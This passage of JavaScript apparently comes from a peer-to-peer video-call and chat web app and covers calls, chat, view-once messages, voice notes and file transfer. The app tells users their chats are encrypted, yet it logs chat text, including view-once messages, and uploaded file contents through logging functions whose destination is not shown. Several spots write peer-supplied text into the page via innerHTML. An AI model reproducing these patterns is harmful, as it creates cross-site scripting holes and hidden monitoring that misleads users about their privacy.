        if (currentRoomId === roomId) {  // Safety check after refresh
            startRecording();
        }
    }, 2200);
}

// ============ LEAVE ROOM ============
function leaveRoom() {
    if (isCallActive || (mediaRecorder && mediaRecorder.state !== 'inactive')) {
        stopRecording();
    }
    if (callStartTime) logEvent('call_ended', { duration: formatCallDuration(), messages: messageCount });
    else logEvent('user_left');

    if (currentCall) { currentCall.close(); currentCall = null; }
    if (dataConnection) { dataConnection.close(); dataConnection = null; }
    
    // Only destroy the PeerJS signaling connection if we are logged out (Anonymous Room Mode).
    // For Cyber Space, KEEP the peer active so you stay online and can call again instantly!
    if (!currentUser) {
        if (peer) { peer.destroy(); peer = null; }
    }
    
    if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
    if (localVideo) localVideo.srcObject = null;
    if (remoteVideo) remoteVideo.srcObject = null;

    waitingScreen.style.display = 'flex';
    callScreen.classList.add('hidden');
    chatPanel.classList.add('hidden');
    chatPanel.classList.remove('direct-chat-mode');
    fileProgress.classList.add('hidden');
    recordingIndicator.classList.add('hidden');
    isMicOn = true; isCamOn = true; isScreenSharing = false;
    incomingFileBuffers = {};
    callStartTime = null; messageCount = 0; currentRoomId = null;
    mediaRecorder = null; recordedChunks = [];
    combinedStream = null; isCallActive = false; currentRemoteStream = null;
    segmentNumber = 0; totalRecordingSize = 0;
    if (recordingTimer) { clearTimeout(recordingTimer); recordingTimer = null; }
    updateControlButtons();

    chatMessages.innerHTML = '<div class="chat-date-pill">Today</div><div class="chat-system">Messages and calls are peer-to-peer encrypted 🔒</div>';
    activeChatUsername = null; activeChatDisplayName = 'App Chat Room'; updateChatHeader(); updateChatComposer();
    showPage(homePage);
    if (window.location.search) window.history.replaceState({}, document.title, window.location.pathname);

    // Re-initialize Cyber Space Peer ONLY if it was destroyed or is null
    if (!peer) {
        checkCyberSession();
    }
}

// ============ COPY LINK ============
function copyLink() {
    navigator.clipboard.writeText(shareableLink.value).then(() => showToast('Link copied! 📋')).catch(() => { shareableLink.select(); document.execCommand('copy'); showToast('Link copied!'); });
}
if (copyLinkBtn) copyLinkBtn.addEventListener('click', copyLink);
if (copyLinkBtn2) copyLinkBtn2.addEventListener('click', copyLink);

// ============ MIC / CAM / SCREEN ============
if (toggleMicBtn) {
    toggleMicBtn.addEventListener('click', () => {
        if (!localStream) return;
        isMicOn = !isMicOn;
        localStream.getAudioTracks().forEach(t => t.enabled = isMicOn);
        updateControlButtons();
        showToast(isMicOn ? '🎙 Mic on' : '🔇 Mic muted');
    });
}
if (toggleCamBtn) {
    toggleCamBtn.addEventListener('click', () => {
        if (!localStream) return;
        isCamOn = !isCamOn;
        localStream.getVideoTracks().forEach(t => t.enabled = isCamOn);
        updateControlButtons();
        showToast(isCamOn ? '📹 Camera on' : '🚫 Camera off');
    });
}

async function switchCamera() {
    if (!localStream) { showToast('⚠️ Start video call first'); return; }
    try {
        const oldVideoTrack = localStream.getVideoTracks()[0];
        if (!oldVideoTrack) { showToast('⚠️ No active video track'); return; }

        currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
        showToast(currentFacingMode === 'user' ? '🤳 Switching to Front Camera...' : '📸 Switching to Back Camera...');

        const isMobile = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const constraints = {
            video: isMobile ? {
                facingMode: { ideal: currentFacingMode },
                width: { ideal: 720, max: 1080 },
                height: { ideal: 1280, max: 1920 },
                aspectRatio: { ideal: 9 / 16 },
                frameRate: { ideal: 30, max: 30 }
            } : {
                facingMode: { ideal: currentFacingMode },
                width: { ideal: 1280, max: 1920 },
                height: { ideal: 720, max: 1080 },
                aspectRatio: { ideal: 16 / 9 },
                frameRate: { ideal: 30, max: 30 }
            },
            audio: false
        };

        const newStream = await navigator.mediaDevices.getUserMedia(constraints);
        const newVideoTrack = newStream.getVideoTracks()[0];
        if (!newVideoTrack) { showToast('❌ Could not switch camera'); return; }

        localStream.removeTrack(oldVideoTrack);
        localStream.addTrack(newVideoTrack);
        if (localVideo) {
            localVideo.srcObject = null;
            localVideo.srcObject = localStream;
        }
        oldVideoTrack.stop();

        if (currentCall && currentCall.peerConnection) {
            const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) {
                await sender.replaceTrack(newVideoTrack);
            }
        }
        originalVideoTrack = newVideoTrack;
    } catch (e) {
        console.error('Camera switch failed:', e);
        showToast('⚠️ Could not switch camera');
        currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
    }
}
if (toggleCamFlipBtn) {
    toggleCamFlipBtn.addEventListener('click', switchCamera);
}
window.switchCamera = switchCamera;

toggleScreenBtn.addEventListener('click', async () => {
    if (!localStream || !currentCall) return;
    if (!isScreenSharing) {
        try {
            const ss = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: 'always' }, audio: false });
            originalVideoTrack = localStream.getVideoTracks()[0];
            const st = ss.getVideoTracks()[0];
            const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) await sender.replaceTrack(st);
            st.onended = async () => { if (sender && originalVideoTrack) await sender.replaceTrack(originalVideoTrack); isScreenSharing = false; updateControlButtons(); showToast('Screen share stopped'); };
            isScreenSharing = true; updateControlButtons(); showToast('🖥 Screen sharing started');
        } catch (e) { showToast('Screen share cancelled'); }
    } else {
        if (originalVideoTrack) {
            const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) await sender.replaceTrack(originalVideoTrack);
        }
        isScreenSharing = false; updateControlButtons(); showToast('Screen share stopped');
    }
});

if (togglePipBtn) {
    togglePipBtn.addEventListener('click', async () => {
        try {
            if (!document.pictureInPictureEnabled) {
                showToast('⚠️ PiP mode not supported');
                return;
            }
            if (document.pictureInPictureElement) {
                await document.exitPictureInPicture();
            } else {
                if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.srcObject) {
                    await remoteVideo.requestPictureInPicture();
                } else {
                    showToast('⚠️ Waiting for video stream...');
                }
            }
        } catch (err) {
            showToast('⚠️ Could not start PiP Mode');
        }
    });
}

// ============ CHAT PANEL TOGGLER (BOTTOM SHEET DRAWER) ============
if (toggleChatBtn) {
    toggleChatBtn.addEventListener('click', () => { 
        if (chatPanel) {
            chatPanel.classList.toggle('hidden');
            // Force reflow for smooth animation
            if (!chatPanel.classList.contains('hidden')) {
                chatPanel.style.transform = 'translateY(0)';
            }
        }
        toggleChatBtn.classList.toggle('ctrl-btn-active'); 
    });
}

let isBurnChatActive = false;
const toggleBurnChatBtn = document.getElementById('menuBurnChatBtn');
if (toggleBurnChatBtn) {
    toggleBurnChatBtn.addEventListener('click', (e) => {
        e.stopPropagation(); // prevent attachment menu from closing if it bubbles
        isBurnChatActive = !isBurnChatActive;
        const iconDiv = document.getElementById('menuBurnIcon');
        if(isBurnChatActive) {
            iconDiv.style.background = '#ff2d75';
            showToast('🔥 View Once Chat Mode ON (10s Auto-Delete)');
        } else {
            iconDiv.style.background = '#00a884';
            showToast('💬 Normal Chat Mode ON');
        }
        document.getElementById('attachMenu').classList.remove('active');
    });
}

// Attachment Menu Toggle
const attachMenu = document.getElementById('attachMenu');
if (attachFileBtn && attachMenu) {
    attachFileBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        attachMenu.classList.toggle('active');
    });
    document.addEventListener('click', (e) => {
        if (!attachMenu.contains(e.target) && !attachFileBtn.contains(e.target)) {
            attachMenu.classList.remove('active');
        }
    });
}

if (closeChatBtn) {
    closeChatBtn.addEventListener('click', () => { 
        if (chatPanel) chatPanel.classList.add('hidden'); 
        if (toggleChatBtn) toggleChatBtn.classList.remove('ctrl-btn-active'); 
    });
}
if (sendChatBtn) sendChatBtn.addEventListener('click', sendTextMessage);
if (chatInput) chatInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendTextMessage(); });

function sendTextMessage() {
    const text = chatInput.value.trim();
    if (!text) return;
    const messageId = createMessageId();
    addChatMessage(text, true, isBurnChatActive, messageId, 'sent', replyingToMessage);
    if (activeChatUsername) updateChatMeta(activeChatUsername, text, Date.now(), true, 'sent');
    messageCount++;
    logEvent('chat_message', { text: (isBurnChatActive ? "[🔥 VIEW ONCE] " : "") + text, sender: userRole });
    if (dataConnection && dataConnection.open) {
        dataConnection.send({ type: 'chat', id: messageId, text, burn: isBurnChatActive, from: currentUser ? currentUser.username : userRole, ts: Date.now(), reply: replyingToMessage });
        // Typing indicator off when sending
        dataConnection.send({ type: 'typing', isTyping: false, from: currentUser ? currentUser.username : userRole });
    }
    chatInput.value = '';
    clearReplyMode();
    updateChatComposer();
}

function updateChatComposer() {
    if (!whatsappComposer || !chatInput) return;
    whatsappComposer.classList.toggle('has-text', chatInput.value.trim().length > 0);
}

function updateChatHeader(statusText) {
    if (chatContactName) chatContactName.textContent = activeChatDisplayName || 'App Chat Room';
    if (chatContactStatus) {
        chatContactStatus.textContent = statusText || (activeChatUsername ? '@' + activeChatUsername + ' • tap call icons to call' : 'end-to-end encrypted');
        chatContactStatus.classList.toggle('typing', statusText === 'typing...');
    }
}

function getChatPrefsKey() { return 'meetlinkChatPrefs_' + (currentUser ? currentUser.username : 'guest'); }
function loadChatPrefs() { try { chatPrefs = JSON.parse(localStorage.getItem(getChatPrefsKey()) || '{}') || {}; } catch(e) { chatPrefs = {}; } }
function saveChatPrefs() { try { localStorage.setItem(getChatPrefsKey(), JSON.stringify(chatPrefs)); } catch(e) {} }
function getCallHistoryKey() { return 'meetlinkCallHistory_' + (currentUser ? currentUser.username : 'guest'); }
function loadCallHistory() { try { localCallHistory = JSON.parse(localStorage.getItem(getCallHistoryKey()) || '[]') || []; } catch(e) { localCallHistory = []; } }
function saveCallHistory() { try { localStorage.setItem(getCallHistoryKey(), JSON.stringify(localCallHistory.slice(0, 50))); } catch(e) {} }
function recordCallHistory(peerUsername, direction, callType, status = 'started') {
    if (!peerUsername) return;
    loadCallHistory();
    localCallHistory.unshift({ peer: peerUsername, direction, callType, status, at: Date.now() });
    localCallHistory = localCallHistory.slice(0, 50);
    saveCallHistory();
    renderLocalCallHistory();
}
function renderLocalCallHistory() {
    const list = document.getElementById('cyberFriendsCallsList');
    if (!list) return;
    const old = list.querySelector('.local-call-history');
    if (old) old.remove();
    loadCallHistory();
    if (!localCallHistory.length) return;
    const wrap = document.createElement('div');
    wrap.className = 'local-call-history';
    wrap.innerHTML = '<div class="section-title call-history-title">RECENT CALLS</div>' + localCallHistory.slice(0, 5).map(c => {
        const icon = c.callType === 'audio' ? 'fa-phone-alt' : 'fa-video';
        const cls = c.status === 'missed' ? 'missed' : '';
        const label = c.status === 'missed' ? 'Missed' : (c.direction === 'incoming' ? 'Incoming' : 'Outgoing');
        return `<div class="call-history-row ${cls}"><i class="fas ${icon}"></i><div><b>@${c.peer}</b><span>${label} ${c.callType} • ${formatChatListTime(c.at)}</span></div></div>`;
    }).join('');
    list.prepend(wrap);
}
function setReplyMode(messageEl) {
    if (!messageEl) return;
    const id = messageEl.getAttribute('data-message-id');
    const text = (messageEl.querySelector('.msg-text') || messageEl.querySelector('span') || {}).textContent || 'Media message';
    replyingToMessage = { id, text: text.slice(0, 90), from: messageEl.classList.contains('sent') ? 'You' : (activeChatDisplayName || 'Friend') };
    let bar = document.getElementById('replyPreviewBar');
    if (!bar && whatsappComposer) {
        bar = document.createElement('div');
        bar.id = 'replyPreviewBar';
        bar.className = 'reply-preview-bar';
        whatsappComposer.parentNode.insertBefore(bar, whatsappComposer);
    }
    if (bar) bar.innerHTML = `<div><b>Replying to ${replyingToMessage.from}</b><span>${replyingToMessage.text}</span></div><button onclick="clearReplyMode()"><i class="fas fa-times"></i></button>`;
    if (chatInput) chatInput.focus();
}
function clearReplyMode() {
    replyingToMessage = null;
    const bar = document.getElementById('replyPreviewBar');
    if (bar) bar.remove();
}
window.clearReplyMode = clearReplyMode;
function createMessageId() {
    return 'm_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9);
}

function getChatMetaStorageKey() {
    return 'meetlinkChatMeta_' + (currentUser ? currentUser.username : 'guest');
}

function loadChatMeta() {
    try { chatMeta = JSON.parse(localStorage.getItem(getChatMetaStorageKey()) || '{}') || {}; }
    catch(e) { chatMeta = {}; }
}

function saveChatMeta() {
    try { localStorage.setItem(getChatMetaStorageKey(), JSON.stringify(chatMeta)); }
    catch(e) {}
}

function updateChatMeta(username, lastMessage, at = Date.now(), isSentByMe = false, status = 'sent') {
    if (!username) return;
    chatMeta[username] = Object.assign({}, chatMeta[username] || {}, {
        lastMessage: lastMessage || 'New message',
        lastAt: at,
        isSentByMe,
        lastStatus: status
    });
    saveChatMeta();
    updateChatMetaRows();
    reorderChatRows();
}

function formatChatListTime(ts) {
    if (!ts) return '';
    const d = new Date(ts), now = new Date();
    const sameDay = d.toDateString() === now.toDateString();
    if (sameDay) return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const yesterday = new Date(now); yesterday.setDate(now.getDate() - 1);
    if (d.toDateString() === yesterday.toDateString()) return 'Yesterday';
    return d.toLocaleDateString([], { day: '2-digit', month: 'short' });
}

function updateChatMetaRows() {
    document.querySelectorAll('[data-chat-username]').forEach(row => {
        const username = row.getAttribute('data-chat-username');
        const meta = chatMeta[username] || {};
        const preview = row.querySelector('.chat-last-preview');
        const time = row.querySelector('.chat-last-time');
        if (preview) {
            let prefix = '';
            if (meta.isSentByMe) {
                if (meta.lastStatus === 'read') prefix = '<i class="fas fa-check-double" style="color: #53bdeb; margin-right:4px; font-size:11px;"></i>';
                else if (meta.lastStatus === 'delivered') prefix = '<i class="fas fa-check-double" style="color: #8696a0; margin-right:4px; font-size:11px;"></i>';
                else prefix = '<i class="fas fa-check" style="color: #8696a0; margin-right:4px; font-size:11px;"></i>';
            }
            let text = meta.lastMessage || 'Tap to chat or call';
            if(text.startsWith('You: ')) text = text.substring(5);
            preview.innerHTML = prefix + text;
        }
        if (time) time.textContent = formatChatListTime(meta.lastAt);
    });
}

function reorderChatRows() {
    const list = document.getElementById('cyberFriendsChatsList');
    if (!list) return;
    const rows = Array.from(list.querySelectorAll('[data-chat-username]'));
    rows.sort((a, b) => {
        const au = a.getAttribute('data-chat-username');
        const bu = b.getAttribute('data-chat-username');
        return ((chatMeta[bu] || {}).lastAt || 0) - ((chatMeta[au] || {}).lastAt || 0);
    });
    rows.forEach(r => list.appendChild(r));
}

function playIncomingMessageAlert() {
    try {
        if (navigator.vibrate) navigator.vibrate([80, 35, 80]);
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const o = ctx.createOscillator();
        const g = ctx.createGain();
        o.type = 'sine';
        o.frequency.setValueAtTime(740, ctx.currentTime);
        o.frequency.exponentialRampToValueAtTime(980, ctx.currentTime + 0.08);
        g.gain.setValueAtTime(0.0001, ctx.currentTime);
        g.gain.exponentialRampToValueAtTime(0.12, ctx.currentTime + 0.015);
        g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.16);
        o.connect(g); g.connect(ctx.destination);
        o.start(); o.stop(ctx.currentTime + 0.18);
        setTimeout(() => ctx.close().catch(()=>{}), 350);
    } catch(e) {}
}

function sendReadReceiptForActiveChat() {
    if (activeChatUsername && dataConnection && dataConnection.open) {
        dataConnection.send({ type: 'read-chat', from: currentUser ? currentUser.username : userRole, peer: activeChatUsername, ts: Date.now() });
    }
}

function updateMessageStatus(messageId, status) {
    if (!messageId) return;
    const el = chatMessages ? chatMessages.querySelector(`[data-message-id="${messageId}"]`) : null;
    if (el) {
        const icon = el.querySelector('.msg-status-icon');
        if (icon) {
            icon.className = 'msg-status-icon fas ' + (status === 'sent' ? 'fa-check' : 'fa-check-double') + (status === 'read' ? ' read-ticks' : ' delivered-ticks');
            icon.setAttribute('data-status', status);
            icon.title = status === 'read' ? 'Read' : status === 'delivered' ? 'Delivered' : 'Sent';
        }
    }
    // Also update recent chats preview tick
    if (activeChatUsername && chatMeta[activeChatUsername]) {
        if (chatMeta[activeChatUsername].isSentByMe) {
            chatMeta[activeChatUsername].lastStatus = status;
            saveChatMeta();
            updateChatMetaRows();
        }
    }
}

function markAllVisibleSentAsRead() {
    if (!chatMessages) return;
    chatMessages.querySelectorAll('.chat-msg.sent .msg-status-icon').forEach(icon => {
        icon.className = 'msg-status-icon fas fa-check-double read-ticks';
        icon.setAttribute('data-status', 'read');
        icon.title = 'Read';
    });
}

function getUnreadStorageKey() {
    return 'meetlinkUnread_' + (currentUser ? currentUser.username : 'guest');
}

function loadUnreadCounts() {
    loadChatMeta();
    loadChatPrefs();
    loadCallHistory();
    try { unreadCounts = JSON.parse(localStorage.getItem(getUnreadStorageKey()) || '{}') || {}; }
    catch(e) { unreadCounts = {}; }
    updateUnreadBadges();
}

function saveUnreadCounts() {
    try { localStorage.setItem(getUnreadStorageKey(), JSON.stringify(unreadCounts)); }
    catch(e) {}
}

function isViewingChatWith(username) {
    return username &&
        roomPage && roomPage.classList.contains('active') &&
        chatPanel && !chatPanel.classList.contains('hidden') &&
        chatPanel.classList.contains('direct-chat-mode') &&
        activeChatUsername === username;
}

function markUnreadFromPeer(username, preview = 'New message') {
    if (!username || username === (currentUser && currentUser.username)) return;
    if (isViewingChatWith(username)) return;
    unreadCounts[username] = (unreadCounts[username] || 0) + 1;
    saveUnreadCounts();
    updateUnreadBadges();
    if (!((chatPrefs[username] || {}).muted)) playIncomingMessageAlert();
    showToast(`🔴 @${username}: ${preview}`);
}

function clearUnreadForPeer(username) {
    if (!username || !unreadCounts[username]) return;
    delete unreadCounts[username];
    saveUnreadCounts();
    updateUnreadBadges();
}

function updateUnreadBadges() {
    const total = Object.values(unreadCounts || {}).reduce((sum, n) => sum + Number(n || 0), 0);
    const chatsTab = document.getElementById('tabBtn-chats');
    if (chatsTab) {
        let tabBadge = chatsTab.querySelector('.tab-unread-badge');
        if (!tabBadge) {
            tabBadge = document.createElement('span');
            tabBadge.className = 'tab-unread-badge';
            chatsTab.appendChild(tabBadge);
        }
        tabBadge.textContent = total > 99 ? '99+' : String(total);
        tabBadge.style.display = total > 0 ? 'inline-flex' : 'none';
    }
    document.querySelectorAll('[data-chat-username]').forEach(row => {
        const username = row.getAttribute('data-chat-username');
        const count = unreadCounts[username] || 0;
        let badge = row.querySelector('.unread-badge');
        if (!badge) return;
        badge.textContent = count > 99 ? '99+' : String(count);
        badge.style.display = count > 0 ? 'inline-flex' : 'none';
        row.classList.toggle('has-unread', count > 0);
    });
}

function startCallFromOpenChat(callType) {
    if (!activeChatUsername) {
        showToast('⚠️ Open a friend chat first');
        return;
    }
    startFriendCall(activeChatUsername, callType);
}

if (chatVoiceCallBtn) chatVoiceCallBtn.addEventListener('click', () => startCallFromOpenChat('audio'));
if (chatVideoCallBtn) chatVideoCallBtn.addEventListener('click', () => startCallFromOpenChat('video'));
updateChatComposer();
updateChatHeader();

// Typing indicator
let typingTimeout = null;
if (chatInput) {
    chatInput.addEventListener('input', () => {
        updateChatComposer();
        if (!dataConnection || !dataConnection.open) return;
        
        dataConnection.send({ type: 'typing', isTyping: true });
        
        clearTimeout(typingTimeout);
        typingTimeout = setTimeout(() => {
            if (dataConnection && dataConnection.open) {
                dataConnection.send({ type: 'typing', isTyping: false });
            }
        }, 1800);
    });
}

function addChatMessage(text, isSent, isBurn = false, messageId = null, status = 'sent', reply = null, isHistoryLoad = false) {
    if (!isHistoryLoad && window.saveMsgToDB && activeChatUsername && !isBurn) {
        saveMsgToDB(currentUser ? currentUser.username : 'anon', activeChatUsername, {
            id: messageId, type: 'text', text, isSent, status, reply, ts: Date.now()
        });
    }

    const d = document.createElement('div');
    d.className = 'chat-msg ' + (isSent ? 'sent' : 'received') + (isBurn ? ' burn-message' : '');
    if (messageId) d.setAttribute('data-message-id', messageId);
    
    if (reply && reply.text) {
        const replyBox = document.createElement('div');
        replyBox.className = 'quoted-reply';
        replyBox.innerHTML = `<b>${reply.from || 'Reply'}</b><span>${reply.text}</span>`;
        d.appendChild(replyBox);
    }
    const msgSpan = document.createElement('span');
    msgSpan.className = 'msg-text';
    msgSpan.textContent = text;
    d.appendChild(msgSpan);

    const metaDiv = document.createElement('div');
    metaDiv.className = 'msg-meta';
    
    const timeSpan = document.createElement('span');
    const now = new Date();
    timeSpan.textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    metaDiv.appendChild(timeSpan);

    if (isSent) {
        const ticksIcon = document.createElement('i');
        ticksIcon.className = 'msg-status-icon fas ' + (status === 'sent' ? 'fa-check' : 'fa-check-double') + (status === 'read' ? ' read-ticks' : ' delivered-ticks');
        ticksIcon.setAttribute('data-status', status);
        ticksIcon.title = status === 'read' ? 'Read' : status === 'delivered' ? 'Delivered' : 'Sent';
        metaDiv.appendChild(ticksIcon);
    }
    d.appendChild(metaDiv);

    if (isBurn) {
        let timeLeft = 10;
        d.innerHTML = `<span class="burn-badge">(🔥 ${timeLeft}s)</span> <span>${text}</span><div class="msg-meta"><span>${now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>${isSent ? `<i class="msg-status-icon fas ${status === 'sent' ? 'fa-check' : 'fa-check-double'} ${status === 'read' ? 'read-ticks' : 'delivered-ticks'}" data-status="${status}"></i>` : ''}</div>`;
        if (messageId) d.setAttribute('data-message-id', messageId);
        const timer = setInterval(() => {
            timeLeft--;
            const b = d.querySelector('.burn-badge');
            if (b) b.textContent = `(🔥 ${timeLeft}s)`;
            if (timeLeft <= 0) {
                clearInterval(timer);
                if (d.parentNode) d.parentNode.removeChild(d);
            }
        }, 1000);
    }

    chatMessages.appendChild(d);
    chatMessages.scrollTop = chatMessages.scrollHeight;
    return d;
}

// ============ FILE SHARING ============
if (attachFileBtn) {
    // Attachment menu initialized in WhatsApp Pro Pack below
}

// ============ VOICE MESSAGE RECORDING (WhatsApp Style) ============
let mediaRecorderVoice = null;
let voiceChunks = [];
let isRecordingVoice = false;
const voiceRecordBtn = document.getElementById('voiceRecordBtn');

if (voiceRecordBtn) {
    // Mobile friendly: touch + mouse
    voiceRecordBtn.addEventListener('mousedown', startVoiceRecording);
    voiceRecordBtn.addEventListener('mouseup', stopVoiceRecording);
    voiceRecordBtn.addEventListener('mouseleave', stopVoiceRecording);
    
    voiceRecordBtn.addEventListener('touchstart', (e) => { e.preventDefault(); startVoiceRecording(); });
    voiceRecordBtn.addEventListener('touchend', (e) => { e.preventDefault(); stopVoiceRecording(); });
}

async function startVoiceRecording() {
    if (!dataConnection || !dataConnection.open) {
        showToast('⚠️ Connect to a chat first');
        return;
    }
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        mediaRecorderVoice = new MediaRecorder(stream);
        voiceChunks = [];
        
        mediaRecorderVoice.ondataavailable = e => voiceChunks.push(e.data);
        mediaRecorderVoice.onstop = () => {
            const blob = new Blob(voiceChunks, { type: 'audio/webm' });
            sendVoiceMessage(blob);
            stream.getTracks().forEach(t => t.stop());
        };
        
        mediaRecorderVoice.start();
        isRecordingVoice = true;
        voiceRecordBtn.classList.add('recording');
        voiceRecordBtn.innerHTML = '<i class="fas fa-stop"></i>';
        showToast('🎙 Recording... Release to send');
    } catch (err) {
        showToast('❌ Microphone permission denied');
    }
}

function stopVoiceRecording() {
    if (!isRecordingVoice || !mediaRecorderVoice) return;
    
    mediaRecorderVoice.stop();
    isRecordingVoice = false;
    voiceRecordBtn.classList.remove('recording');
    voiceRecordBtn.innerHTML = '<i class="fas fa-microphone"></i>';
}

function sendVoiceMessage(blob) {
    const tid = 'voice_' + Date.now();
    const messageId = createMessageId();
    const reader = new FileReader();
    reader.onload = () => {
        const base64 = reader.result.split(',')[1];
        dataConnection.send({ 
            type: 'voice',
            id: messageId,
            from: currentUser ? currentUser.username : userRole,
            transferId: tid, 
            data: base64,
            duration: Math.max(1, Math.round(blob.size / 16000)) 
        });
        addVoiceMessageToChat(blob, true, null, messageId, 'sent');
        if (activeChatUsername) updateChatMeta(activeChatUsername, '🎙 Voice message', Date.now(), true, 'sent');
    };
    reader.readAsDataURL(blob);
}

function addVoiceMessageToChat(blob, isSent, receivedUrl = null, messageId = null, status = 'sent', isHistoryLoad = false, base64 = null) {
    if (!isHistoryLoad && window.saveMsgToDB && activeChatUsername) {
        let b64 = base64;
        if (!b64 && blob) {
            const reader = new FileReader();
            reader.onload = () => {
                saveMsgToDB(currentUser ? currentUser.username : 'anon', activeChatUsername, {
                    id: messageId, type: 'voice', isSent, status, ts: Date.now(), base64: reader.result
                });
            };
            reader.readAsDataURL(blob);
        } else if (b64) {
            saveMsgToDB(currentUser ? currentUser.username : 'anon', activeChatUsername, {
                id: messageId, type: 'voice', isSent, status, ts: Date.now(), base64: b64
            });
        }
    }

    const div = document.createElement('div');
    div.className = 'chat-msg voice-msg ' + (isSent ? 'sent' : 'received');
    if (messageId) div.setAttribute('data-message-id', messageId);
    let audioUrl = receivedUrl;
    if (!audioUrl && blob) audioUrl = URL.createObjectURL(blob);
    else if (!audioUrl && base64) audioUrl = base64;
    
    const duration = blob ? Math.max(1, Math.round((blob.size || 16000) / 16000)) : 2;
    div.innerHTML = `
        <div class="voice-note-ui">
            <div class="voice-avatar-ui"><i class="fas fa-user"></i></div>
            <button class="voice-play-btn" type="button"><i class="fas fa-play"></i></button>
            <div class="voice-wave"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></div>
            <span class="voice-duration">0:${String(Math.min(duration, 59)).padStart(2, '0')}</span>
            <audio src="${audioUrl}"></audio>
        </div>
        <div class="msg-meta"><span>${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>${isSent ? `<i class="msg-status-icon fas ${status === 'sent' ? 'fa-check' : 'fa-check-double'} ${status === 'read' ? 'read-ticks' : 'delivered-ticks'}" data-status="${status}" title="${status}"></i>` : ''}</div>
    `;
    const btn = div.querySelector('.voice-play-btn');
    const audio = div.querySelector('audio');
    btn.addEventListener('click', () => {
        if (audio.paused) {
            audio.play();
            btn.innerHTML = '<i class="fas fa-pause"></i>';
            div.classList.add('playing');
        } else {
            audio.pause();
            btn.innerHTML = '<i class="fas fa-play"></i>';
            div.classList.remove('playing');
        }
    });
    audio.addEventListener('ended', () => { btn.innerHTML = '<i class="fas fa-play"></i>'; div.classList.remove('playing'); });
    chatMessages.appendChild(div);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}
if (fileInput) {
    fileInput.addEventListener('change', () => {
        const files = fileInput.files;
        if (!files.length) return;
        for (let i = 0; i < files.length; i++) sendFile(files[i]);
        fileInput.value = '';
    });
}

async function sendFile(file) {
    if (!dataConnection || !dataConnection.open) { showToast('No data connection.'); return; }
    const tid = 'f_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    const ab = await file.arrayBuffer();
    const tc = Math.ceil(ab.byteLength / CHUNK_SIZE);
    logEvent('file_sent', { fileName: file.name, fileSize: ab.byteLength, sender: userRole });
    logFileUpload(file.name, ab);
    fileProgress.classList.remove('hidden');
    fileProgressFill.style.width = '0%';
    fileProgressText.textContent = `Sending ${file.name} (0%)`;
    dataConnection.send({ type: 'file-start', transferId: tid, fileName: file.name, fileSize: ab.byteLength, totalChunks: tc, mimeType: file.type || 'application/octet-stream' });
    for (let i = 0; i < tc; i++) {
        const s = i * CHUNK_SIZE, e = Math.min(s + CHUNK_SIZE, ab.byteLength);
        dataConnection.send({ type: 'file-chunk', transferId: tid, chunkIndex: i, data: ab.slice(s, e) });
        const pct = Math.round(((i + 1) / tc) * 100);
        fileProgressFill.style.width = pct + '%';
        fileProgressText.textContent = `Sending ${file.name} (${pct}%)`;
        if (i % 5 === 0) await new Promise(r => setTimeout(r, 10));
    }
    dataConnection.send({ type: 'file-end', transferId: tid });
    addFileToChat(file.name, ab.byteLength, file.type, ab, true);
    if (activeChatUsername) updateChatMeta(activeChatUsername, '📎 ' + file.name, Date.now(), true, 'sent');
    fileProgress.classList.add('hidden');
    showToast(`✅ ${file.name} sent!`);
}

function playNotificationSound() {
    try {
        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.type = 'sine';
        osc.frequency.setValueAtTime(600, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(1200, ctx.currentTime + 0.1);
        gain.gain.setValueAtTime(0, ctx.currentTime);
        gain.gain.linearRampToValueAtTime(0.3, ctx.currentTime + 0.05);
        gain.gain.linearRampToValueAtTime(0, ctx.currentTime + 0.15);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.2);
    } catch(e) {}
}

function handleDataMessage(data) {
    if (!data || !data.type) return;
    const senderPeer = data.from || (dataConnection && dataConnection.peer) || activeChatUsername || 'friend';
    if (data.type === 'chat') {
        playNotificationSound();
        addChatMessage(data.text, false, data.burn || false, data.id || null, 'sent', data.reply || null);
        updateChatMeta(senderPeer, data.burn ? '🔥 View-once message' : (data.text || 'New message'), data.ts || Date.now(), false);
        markUnreadFromPeer(senderPeer, data.burn ? '🔥 View-once message' : (data.text || 'New message'));
        if (dataConnection && dataConnection.open && data.id) {
            dataConnection.send({ type: 'message-delivered', id: data.id, from: currentUser ? currentUser.username : userRole });
            if (isViewingChatWith(senderPeer)) dataConnection.send({ type: 'message-read', id: data.id, from: currentUser ? currentUser.username : userRole });
        }
        messageCount++;
        logEvent('chat_message', { text: (data.burn ? "[🔥 VIEW ONCE] " : "") + data.text, sender: userRole === 'creator' ? 'joiner' : 'creator' });
    }
    else if (data.type === 'typing') {
        const typingDiv = document.getElementById('typingIndicator') || createTypingIndicator();
        typingDiv.style.display = data.isTyping ? 'block' : 'none';
